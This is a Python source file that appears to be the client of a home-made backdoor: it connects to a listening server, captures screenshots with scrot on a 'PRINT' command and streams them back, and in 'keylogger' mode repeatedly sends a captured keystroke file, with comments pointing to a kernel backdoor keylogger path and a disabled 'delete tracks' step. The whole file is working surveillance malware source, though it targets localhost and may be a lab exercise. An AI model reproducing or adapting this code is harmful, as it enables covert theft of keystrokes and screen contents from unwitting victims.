import socket
import time
import sys
import os

def send_file(filename, sock):
    # OPEN FILE TO READ
    with open(filename, 'rb') as file:
        while True:
            # READ FILE
            data = file.read()
            
            # SEND FILE TO SERVER
            sock.sendall(data)

            break
            # WAIT 10 SECONDS TO SEND THE FILE AGAIN
            #time.sleep(10)
    print('sai do while')


def handle_prt_sc(destination_address, destination_port):
    target_file = '/home/michel/pessoal/'
    screenshot = 'screenshot-'
    n = 0
    end_file = 'END_FILE'

    # CREATE SOCKET
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # CONNECT TO SERVER
        sock.connect((destination_address, destination_port))

        while True:
            data = sock.recv(1024).decode('utf-8')
            print('cliente recebeu: ', data)

            # TAKE AND SEND PRINT SCREEN
            if data == 'PRINT':
                # change picture's name
                new_file = target_file + screenshot + str(n) + ".jpg"  
                # take the print screen
                os.system("scrot " + new_file)
                #send file
                send_file(new_file, sock)
                # send a marker to inform that the file its end
                sock.send(end_file.encode('utf-8'))
                # delete tracks
                #os.system("rm " + target_file)
                n += 1



    finally:
        # CLOSES SOCKET
        sock.close()

def handle_keylogger(destination_address, destination_port):
    target_file = 'oi.txt'

    # CREATE SOCKET
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # CONNECT TO SERVER
        sock.connect((destination_address, destination_port))

        while True:
            send_file(target_file, sock)

    finally:
        # CLOSES SOCKET
        sock.close()

# EXECUTES THE CLIENT
if __name__ == '__main__':
    #target_file = '/sys/kernel/debug/backdoor/keylogger'
    destination_address = '127.0.0.1'  
    destination_port = 8080  
    
    if sys.argv[1] == 'keylogger':
        handle_keylogger(destination_address, destination_port)
    elif sys.argv[1] == 'prtsc':
        print('enter here')
        handle_prt_sc(destination_address, destination_port)